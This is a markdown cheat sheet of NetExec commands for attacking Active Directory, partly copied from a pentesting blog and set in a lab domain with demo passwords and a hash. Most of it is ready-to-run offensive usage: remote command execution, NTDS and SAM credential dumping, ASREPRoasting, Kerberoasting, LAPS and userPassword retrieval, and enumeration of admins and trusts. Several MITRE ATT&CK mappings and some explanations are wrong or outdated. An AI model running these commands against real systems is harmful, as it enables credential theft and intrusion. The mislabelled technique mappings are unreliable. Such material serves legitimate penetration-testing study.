**Netexec** can enumerate users and their privileges on Windows systems using different type of protocols.

### Basic Usage
```bash
netexec <protocol> <ip> -u 'username' -p 'password'
```

- Enumerate Shares

```bash
netexec <protocol> <ip> -u 'username' -p 'password' --shares
```

- Execute Commands Remotely

```bash
netexec <protocol> <ip> -u 'username' -p 'password' -x 'command'
```

- Access shared files

```bash
netexec <protocol> <ip> -u 'username' -p 'password' --get 'share_name/file_path'
```

- Check User and Group Information

```bash
netexec <protocol> <ip> -u 'username' -p 'password' --users
```

- AD Password Dumping

```bash
netexec smb <ip> -u 'username' -p 'password' --ntds
```

- Local Users Password Dumping

```bash
nxc smb 192.168.1.43 -u 'username$' -H 'hash' --sam
```

 - Enumerating users using `--rid-brute`
If the target's `IPC$` is readable (or you can connect with a low‑privilege account like `guest`) you can enumerate RPC/SAM information and run a RID brute to discover account names:
```bash
nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute
```

To extract the discovered usernames more cleanly, run:
```bash
netexec smb 192.168.1.43 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | sed -n "s/.*\\\\\([^ ]*\).*/\1/p" | sort -u
```


---
## Exhaustive Netexec guide
> Notes copied from [hackingarticles](https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/).

### Test if an Account Exists without Kerberos

**Purpose**: This command is used to check whether an account exists within Active Directory without Kerberos protocol. When using the option -k or–use-kcache, you need to specify the same hostname (FQDN) as the one from the kerberos ticket

```bash
nxc ldap 192.168.1.48 -u "user.txt" -p '' -k
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNNNwiICcOsj4aDlCXW9UA9lHsLKnsuIDyQSWVxK3ROflZw1luCD7lNHFbJtvAr3j2_ViYUWMHkEWF3wMckPaJcITORBsRPa29lJzmsxOSXIr4MvthV6AMYefiFN9u3gI1bbXUf9tu1nwPtuuNKWJ4ubLctviaMAyIDiO-F9QwmXVnkiXymF98pO1s7t1A/s16000/0.png)

**Explanation**:

- -u “user.txt”: List of usernames to check.
- -p ”: No password is supplied (since it’s only testing account existence).

**MITRE ATT&CK Mapping**:

**T1071** – Application Layer Protocol: LDAP (This is a reconnaissance activity using LDAP).

### Testing Credentials

**Purpose**: This command tests a user’s credentials to validate whether they are correct, either with a plaintext password or an NTLM hash.

**Using username and password**:

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyPTNloJ7_4WnoXsT_j2iT8nUIfdx3yiF_NWJwwsmKnmI3E9qmbOg6ZeRUgnAXHG_LuvZ6uNZ8LsEvnkAHbS5fxeSJZRzfub5Kpj8nz72jHxNj0yrQwTgK0sWfre8xDFTDNyU6Svkn6_QGHctQEy_SoSd0Kl0u6nhwsjcdsQCbug00cnmGiDDdbSyCQkKh/s16000/1.png)

**Using NTLM hash**:

```bash
nxc ldap 192.168.1.48 -u raj -H 64FBAE31CC352FC26AF97CBDEF151E03
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRPu8pyvDOdWHt3WW0JHfVjK6tD4BMRS7Y5O5WBintPNsR-PsLyQQymPSba8i7cpqcRnhox-I5fDQ6eo4W0-YqdtgRGgaGHpYs2HpBIkjBGL-G1eVuq5TPzqzgRo_w-BAI6mDfBv8kwif3WDcGiaCiwbmeQJxjoIoSGLNpB1muvjlnExe2hheRChn8wQBj/s16000/2.png)

**Explanation**:

- -u raj -p Password@1: Tests the raj user with the given password.
- -H hash: Uses an NTLM hash instead of a plaintext password.

**MITRE ATT&CK Mapping**:

**T1110** – Brute Force (Credential testing using hashes).

### Enumerating Users

**Purpose**: To retrieve all user accounts in the Active Directory domain. This is a key reconnaissance step to identify potential targets for further attacks.

**All users**:

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 –users
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPTRqRWx06WIvW0xSxjU5htUp1Mabc-uaFomiERUwra57t1x_EVSwgP95mdNBboJxePrnUYddp6IJ4gxMUUEbs_e3vVLZrdSMM6N0UUq5fRRsQUGMFs6B_4vbwgAuWU_Wx3OE60et_v9U2W6-mj835HWapr9OXglL90rMf063HQJNjIzECNFttt5G5PfoD/s16000/3.png)

**Active users**:

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 --active-users
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkSroayYIU2n7yVXRA8WrmlMktPJKI3LiWm-6v4t76jG2o1Yni26GaadT9caphvyv_2FWQJLR5ClxtCZg_GX2HDgLc59SK0jx-rvfJ-YpNlbrq61-sg_kxZl_gjv0MOeUesFFgO4jzStiErz-pGsHvgVRuYoC7TuguYmKxTb1RB_MOwaizs3sdc4fPLGA8/s16000/4.png)

**Explanation**:

- –users: Retrieves all users in the directory.
- –active-users: Filters the result to only active users (i.e., not disabled).

**MITRE ATT&CK Mapping**:

**T1087** – Account Discovery.

### LDAP Queries for Specific Users

**Purpose**: Queries LDAP for specific user attributes, such as their sAMAccountName.

**Query a specific user**:

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 --query "(sAMAccountName=aarti)" ""
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgyUEersDg3drlfgDYlQgu0pZeVL0ARbeqxZ0Vv8agJu2eR04n3UDzenxqkZmjHpGGNwU8zAOx8sz6IZSzbCikZCGaq8GL8OaBnKGJcvwZ9NhfTTmtieKVz5iIrl9DZYunIZd5zD-qOLSN1rXr_xz0pFQ3VPHlCq9s3jwKR_Y-QKyshgUtyvHyaVDfRSfe/s16000/5.png)

**Query all users**:

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 --query "(sAMAccountName=*)" ""
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMETTUTDQKfA-M2z0fVze677PG1_0dqQNrM4ZqYCycdfy9IB17YEHMPTvJycWCjRalaDKTa9gYzpXFgd7xnAWqwj4nkv54TVT2TX2kL8jEqtat93VPZEOdmI-jn0xNqxmHv9ONL3L1h8HhGJtdR6XjmxQQ4EzXFmnnUMY6lGQVKy-3utCZ2CQoFhiNRaqI/s16000/6.png)

**Explanation**:

- –query “(sAMAccountName=aarti)”: Queries for a user with the sAMAccountName “aarti”.
- –query “(sAMAccountName=*)”: Retrieves all users in the AD environment.

**MITRE ATT&CK Mapping**:

**T1087** – Account Discovery.

### ASREPRoasting

**Purpose**: **ASREPRoasting** exploits **accounts** that do not require **Kerberos pre-authentication** to extract **service ticket hashes**, which can then be **cracked offline**.

**Without Authentication**:

```bash
nxc ldap 192.168.1.48 -u yashika -p '' --asreproast output.txt
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEig8CGNigQ_pI1NSr8MorCQhAQkaKIaOsEcvturSibAIqLjPxnNUtCcPtntAEIZNDAUAvdTWxnePc7mNqEkQngXBTqjTa3u2kbKZ1oCydwi4kcWK2yfT4KMSLxCpyOeUwuwcKUqsKLSjJgJIwaW_Urxf-sfDlquIHJ8ON41nGZQo_crKnXiMPgOA4JPCKDl/s16000/7.png)

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiau8LA9-oXNtgF5jGcffqTfk5Shm9TcrSSptgkXVzfu9XgfaqwYoTdO0iQT5j6wlsTjBz9tks0-VcCMAT7z7XsRrKWh78wBywwSRFsKMdacS7QPcHWlLz2qRGw-dHCUHvCbhYaDhG8Rc9QDrb8vyskqo41PZfOGTR1j1rGBkz5-TkoNn7bmj3UzxVHS4wV/s16000/8.png)

**With a list of users**:

```bash
nxc ldap 192.168.1.48 -u "users.txt" -p '' --asreproast output.txt
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLjXOW2TKgu_dukWI-2IhL4hZ9M08Zu_Lw9WHPha9nI8ne0ZdO28w1Tg53hk2sNmQfcHEUoSjdbDnxLwv7lLezTjypXnjedhmLMxG_WvtPtb-uwBl4KmbbZJRTFvixl_v7RTfPGdwUT3FdqM00ASBLTbnSfc1-80taiSc_v3jIpRCNHZnPqDHvmjX2EhQA/s16000/9.png)

**Explanation**:

- –asreproast output.txt: Extracts ASREP (Kerberos Pre-Authentication) hashes and saves them to output.txt.
- –dns-server: Specifies the DNS server to resolve domain names.

**MITRE ATT&CK Mapping**:

**T1558.001** – Kerberos Ticket Extraction.

### Find Domain SID

**Purpose**: Retrieves the Domain Security Identifier (SID), which is a unique identifier for the domain.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 --get-sid
``` 

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivgIjNm4FScldmaxyThSxdlvAq5YSYaq_uOQpkgbns4uaRwAit2-R4NSHGx6ndc-_eVKFvlMpN8ZVw4hse4clCpSICJVSFEG1CIExqjioypKUNHh-l6kp6ytuygFExJVP1o2TN9dM8dR3sbLa8PcVzrUwC1cpXGEjtjeJXkgIxjSdpiuqIRFTXuZIYPdXL/s16000/10.png)

**MITRE ATT&CK Mapping**:

**T1071** – Application Layer Protocol: LDAP. The Domain SID is important for NTLM relay and privilege escalation attacks.

### Admin Count Enumeration

**Purpose**: Identifies high-privilege accounts such as Domain Admins by checking the AdminCount attribute.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 --admin-count
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJyPd19W56QBqaqjTeYLgfFXjyDIoED5iWjzgjVF8tGEHHN0dg74BMPhn3UGXlTVnjOLCKuxvOIqmblW8i8RnYmw5JZ_A6eWdZLcofNqghrWHrfprapZExlpsKdKCulLQalzkZDJtoBhpTbHwHaag9GexJcVve2vaMIWiOe6-NqCyfViQkbCB-1Ol62edj/s16000/11.png)

**MITRE ATT&CK Mapping**:

**T1087** – Account Discovery.

### Kerberoasting

**Purpose**: Kerberoasting extracts service account hashes by requesting service tickets for accounts with SPNs (Service Principal Names).

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 --kerberoasting hash.txt
``` 

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWfPJxfx5Gf4Kxnf9lUtirm4HYs6K0qSrOoQCvziAO84vwILl2yeUJwgZtj6vFvIQ2QXGIjvHu9udzuHsyqBEBVc4p8JJyBkxLVEkbNeTdwRJ-yqpmGUKZAmrjZNtGTTzd7ZJ8ptj58dLtKthmdqV6MI0StmJIK8E_d-VdbuVOLPhTqqed7Igqgx8Cymgr/s16000/12.png)

**MITRE ATT&CK Mapping**:

**T1558.001** – Kerberos Ticket Extraction.

### BloodHound Ingestor

**Purpose**: The BloodHound ingestor is used to collect data for use in BloodHound, a tool for mapping AD attack paths.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 --bloodhound --collection All --dns-server 192.168.1.48
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvr-ItBjFrTaskhJYqqwWYzbwI-LDu2wudYFcxMnSA5tlmCJF3fyOgBE-ZaR3SXEndkC6jKmmpmWjU_uF9v0vKPf6uovs2LVJ1UalrPTJDxZNil01L9UXGs1bs0-6tp23QdN3TQehx-jSQz1LNpVY5EnvBg5EphU4Tg9dRAWwshmrhBADnxb9l2IkyoS8a/s16000/13.png)

**MITRE ATT&CK Mapping**:

**T1087** – Account Discovery.

### User Description Enumeration

**Purpose**: Enumerates the user descriptions for identifying potential sensitive information.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M user-desc
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiensVQaN9QTBKjX14BLvDuntc1s5C1s4CFJabdNqqvKOPo8PUlsMKZjXW7FAWTYwjAkZ7W0sVEkCV1jU4xhNF9uSQThSOGSRcEyBxTjuQgJW2XtX99h48jivHPw-tJ2pjbUSclOAQ4x6CfCsKtpE5z5owG98Vv7rvBbQyNL06T3y9E5GybK2V-gm0gWna/s16000/47.png)

**MITRE ATT&CK Mapping**:

**T1087** – Account Discovery.

### WhoAmI Command

**Purpose**: The whoami command retrieves the current authenticated user in the session.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M whoami
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4-xNDqo-sPLlaeQxjfszf7KOMpGIoFxnhc97ylRgM5KoaY41WE9os6DbUbXSkI_y6mQ_ZjrJ3OrZ2hUcG66DFfX49UJ1tq60xu5DbHapN3wkdIcmTlu64GPCO6e1okXa_isWCb7mf5oiIaJKI42k2g7_swXMcSRtMRtIk5NtPyf1gw-kWgWnMc1yDrRaL/s16000/48.png)

**MITRE ATT&CK Mapping**:

**T1087** – Account Discovery.

### Enumerating Group Membership

**Purpose**: This command is used to enumerate the groups that a specific user is a member of. This helps identify high-privilege groups and lateral movement opportunities.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M groupmembership -o USER="ankur"
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTNAGf-rIZzkw3fi9jnimmNw8SCxI8g2itXpkPAibF7vsFSFoZ8LbV7sGotLy55muo9x61Sajsb7XDTONbPnn2iFPRwZ4t3kaHrxhuzK47KAVoGOka0HUtsQdO_Id2SwK2JBEWmfat-Vw49y60kgMOAx_pMsP6iQMOZ8K-YOGOnXXnHbO26nmtwBKOrUbH/s16000/49.png)

**Explanation**:

- -M groupmembership: Enumerates the groups that the specified user is a member of.
- -o USER=”ankur”: Specifies the username for which group membership is being queried.

**MITRE ATT&CK Mapping**:

- **T1087** – Account Discovery.
- **T1075** – Pass the Hash (can be used to escalate privileges within group memberships).

### Group Members Enumeration

**Purpose**: This command allows you to enumerate the members of a specific group, such as “Domain Admins” or “Domain Users,” which can reveal key targets for attacks.

**Enumerating members of “Domain Users**

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M group-mem -o GROUP="Domain users"
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHhECv3Fkf6xvWm6MGujqfatUY0ORbBJNgRCZu4qcHa1X3qa06jdFRK660UfShlGpIMyA3qMEgoeDEAwUpg8toaqNJmFLfww7rLOnoFfZ3U2-A9BBF6ivka1lNKcHRdpgfo8cu_wGQnbIsoe5hC2LlixuyfXB2yk8ygUk5d6m5fbWohLA4gGC9h1YQvBpy/s16000/50.png)

**Enumerating members of “Domain Admins”**:

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M group-mem -o GROUP="Domain admins"
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0hxqEDawROAa3Kvz7K6V5p7ZRkw5kTc4JeSqJcCjgYaqO0pmF4adXlaahP4q6Zg4ZP2U-AYJL_ULTCLc8LXXi8KfRfYSucqgd9uoIe-xVCiNguhOF_6luSprWc55V8raFpR_6RbK3l7CqEg-OkEEVjnco9SP6oVrO90rx5aI71uG5wuVmP5QqX700XYYC/s16000/51.png)

**Explanation**:

- -M group-mem: Enumerates the members of a specific group.
- -o GROUP=”Group Name”: Specifies the group to query (e.g., “Domain Admins”).

**MITRE ATT&CK Mapping**:

**T1087** – Account Discovery.

### Machine Account Quota

**Purpose**: This command checks the quota for creating machine accounts in Active Directory, which can be useful for identifying potential opportunities for creating rogue machines or bypassing group policies.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M maq
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjBliCioEFxAcdRvQKyI4tIJ7NA4CoH4yZX5zIF-hzjDKDTbrMvIo0FNEKbn8Mar_GnuvJ765DRp9QoKrj3V7jOmXBw3b0z68UY33hNfyeqOkDA3Yk-0tHEl0-797Wo_mlB-qyAj7zGHOzRnmCXD0lsOuWT51USJqOnbBkP49eg_Uaxyt_EiQl_OcbOg6_/s16000/52.png)

**MITRE ATT&CK Mapping**:

**T1077** – Windows Admin Shares (creating machine accounts to gain access).

### Get User Descriptions

**Purpose**: This command enumerates the descriptions associated with user accounts, which can sometimes contain valuable information such as roles, responsibilities, or even credentials.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M get-desc-users
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiq9MXwoLxfU4jAC2zQ-IQ6bBB9dss0_MstFRL6D8VSiH0Lk_02uAcO-kmw2xn7SH9fIK99TUe1LJ9KFI8yj8brgSJ8w_K0BsFJruWZo8hb8CGzar4xgeS2YcEGx0xDg9cStakxn_aMsnWvV8gI3hcKsxsWN9J2vtESn9RLSi-WGHwW3UwaXaZNkr4p1Sjr/s16000/53.png)

**MITRE ATT&CK Mapping**:

**T1087** – Account Discovery.

### LAPS Enumeration

**Purpose**: LAPS (Local Administrator Password Solution) is a Microsoft solution that randomizes and stores local administrator passwords. This command retrieves the LAPS password for local administrator accounts.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M laps
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQZaoRSyWPtIk0S966UUn1qZLa7suIRtDFTiwYjp5PgCO93wAQ5CyJrKnnJDl4mkLKYKAn2mx73TfpOm1VSspfV_ysOJ8DV5zzYuDOzwKIxEXyqFRH5Z_3aEpeYWT2xTZpztR4J-emWx5MUwAIw-TKY9dY79uANQAFILyfQT9MmpjwChXVRU9_pi46FSi_/s16000/54.png)

**MITRE ATT&CK Mapping**:

- **T1087** – Account Discovery.
- **T1110** – Brute Force (to brute force local administrator passwords).

### Extracting Subnet Information

**Purpose**: This command retrieves subnet information, which can help in identifying the network layout and plan further attacks such as lateral movement or exploiting vulnerable machines.

```bash
nxc ldap "192.168.1.48" -u "raj" -p "Password@1" -M get-network
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgjjoE8CFKvfOE0-gW1KhbTjawI8HHAkZT54V3ZkUPIY_zkhuBaSFKMjg_-Gi_YZY9q2qsFQiGyOLjjRvHVbcCc5LAplcI_0alL1krhyphenhyphenEngzyf0HCk2LYPHFrcBqnYcO4WcJR9e8rZh106VFcLivIH9QPXlcIETeOGACsUdspkisKiPIzdlf7YVBEmDoEW/s16000/55.png)

**MITRE ATT&CK Mapping**:

**T1010** – Application Layer Protocol: SMB.

### DACL Reading

**Purpose**: The **DACL (Discretionary Access Control List)** reading command is used to view access control lists for specific AD objects, which can help identify overly permissive access or misconfigurations.

```
nxc ldap 192.168.1.48 -u raj -p Password@1 --kdcHost ignite.local -M daclread -o TARGET=Administrator ACTION=read
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiIBe6Fq0S_jVNFC5IMf14XmcS-2nJS7rVu7MoYsLQwMvCqHxJGUE3QSY30aS__Ac_N4iLN5dHUSFj5BFjfF7DaVeYTDr_yB7xgHTAhVl2vWN7UKxfxoYoW-MlW9jtfXwptZxXgAuGRVBodqwrt5GUL839PE5exBst_WeyFmeAuKQ7vDalIJ2HreqzDASwT/s16000/56.png)

**Explanation**:

- -M daclread: Reads the DACL of the specified target.
- -o TARGET=Administrator ACTION=read: Specifies the target object (e.g., “Administrator”) and the action to be performed (read the DACL).

**MITRE ATT&CK Mapping**:

**T1074** – Data Staged (collecting information about DACLs for privilege escalation).

### Get User Passwords

**Purpose**: This command retrieves user passwords, which can be critical for offline cracking or further attacks.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M get-userPassword
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuMSm0_IoAEG7i2ThChRy11kA9vkmcfTvLjThsTEoDDqetoGf01GnT5rQZJNmA1hll5deMOC3obxlB_SlF08NbGahteuE71PN1hxjCF6mQd3jRprf-8jF6anRWcfRpgLycCBHUC63bAejcsmyh0DX9DPN7Xg5lVObbfcig1HcK_nLk4t1vqq1OzddFSSAY/s16000/57.png)

**MITRE ATT&CK Mapping**:

**T1003** – OS Credential Dumping.

### Get Unix User Password

**Purpose**: This command retrieves passwords for Unix-based systems if integrated with AD. It is useful for assessing whether Unix accounts are vulnerable to attacks such as Pass-the-Hash.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M get-unixUserPassword
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfG0dQ1OONvQG3R6mliy2zrbl_Q_vTm25v8toE-5T-wr401EmbeRxGq_Vg37NxHLlvRPQDrxK169rCPVpdBU5ST_8r4cRdTZqIInapu7KRGK0YAew0KWnjcCTK2HCTRImrLONAer74TJOE4lLVDcynE8j3a2-pttjml5whh7OjrS2tRh74WlM-OK7y1zOp/s16000/58.png)

**MITRE ATT&CK Mapping**:

**T1003.003** – OS Credential Dumping: Unix.

### Password Settings Objects (PSO)

**Purpose**: This command retrieves the **Password Settings Objects** (PSO), which are used to define password policies in AD. If misconfigured, these could allow an attacker to bypass certain password requirements.

```bash
nxc ldap 192.168.1.48 -u administrator -p Ignite@987 -M pso
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEialbuLjLL1JPhN8BHx3MnvgNsiekBAmsjGxNCSV6Q9TNuSJ5C00ZipiYiLJxGVlpcLBVG0dNVcJ5YbtBX-m9kxPyAdNtv_LRjG75PLyJY3SwYuQ3L2qU-IGU_21FR6LO60iKu-NjlvANvlkdYdd-z20cuR71oKD_nDtbCX7X_hkkf0pPqeb36K3-usIfq8/s16000/59.png)

**MITRE ATT&CK Mapping**:

**T1071** – Application Layer Protocol: LDAP (retrieving password policies).

### Trusts Enumeration

**Purpose**: Enumerates trust relationships between different domains, which can be useful for lateral movement and attacking interconnected domains.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M enum_trusts
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbO4vDzxw27GDyngT9WePzM8yVybua7GAIuP2IfKEtyqmHoEaFKJKtgj3K7q4AzecUtnKIlzQa0M-7NNiPQEj5XgpPS9_1roW1qpx5BUNb9VnnlsqWQ7ov17k90tfXsu4RE2iNYKre1B_3pcKnNMg1XtTZygdLnmBUERUop7DBXcFZulBXrElpmm1OxMIN/s16000/60.png)

**MITRE ATT&CK Mapping**:

**T1076** – Remote Desktop Protocol (RDP) (used for lateral movement once trust relationships are identified).

### Identifying Pre-Created Computer Accounts

**Purpose**: This command identifies pre-created computer accounts that could be used for bypassing security controls or creating rogue machines on the network.

nxc ldap 192.168.1.48 -u raj -p Password@1 -M pre2k

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEKhLq-vebEMutWFoVQUE6niTQ0f1mK1MpwG6D9lasrlvdkTZNNQFfKpKLgf9SLLjMbmyDuCDBvTJsnf2Wwj8YRfSjhnTt7OQSHQ3MxS_kCnryUkphy6YPvzWZrYeVLhKzcQevLHmqkvV4Pde6oAguBE_IVc_hewqRwHtXajejUrenD3bcYI9S0uQ3B-C_/s16000/61.png)

**MITRE ATT&CK Mapping**:

**T1077** – Windows Admin Shares.

### Active Directory Certificate Services (ADCS)

**Purpose**: ADCS can be exploited to issue certificates for unauthorized machines. This command checks for misconfigurations or exploitable configurations within ADCS.

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M adcs
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkN2FEDJo3x1xQmP7VwbpNUV-At0C1aDEs1WgEJfXT_IjdxtdANFia0Zz1JwH1b20fDWLI0A_mPEpwr-xdczEvRCUcZF679XuYUooh0BHciCF9usOsVFIdYI9n1HhKSwKSsDbet9BQ_bJKOovVlVfYO4wbMLZv3s6cEkYJ5YHYgEkV7sy6VyUCJenRiBGC/s16000/62.png)

**MITRE ATT&CK Mapping**:

**T1553.003** – Application Layer Protocol: SMB.